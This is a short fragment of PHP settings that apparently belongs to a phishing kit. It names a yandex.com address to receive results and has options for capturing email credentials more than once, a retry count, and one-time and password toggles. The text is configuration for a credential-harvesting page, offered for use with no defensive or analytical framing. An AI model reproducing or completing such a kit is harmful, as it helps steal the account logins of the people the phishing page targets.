...
// Start of setting
// Adjust as you wish
$email_result = "d14b70xx@yandex.com";
...
$salt = "q1w2e3r4t5"; //type anythin u want here would make page stronger
...
$emailretry = "off"; // get email credentials more than once
$numberofretries = 1; //Number of times to get email credentials
// Use 'on' or 'off'
$onetime = "off";
$site_pass_on = "off"; 
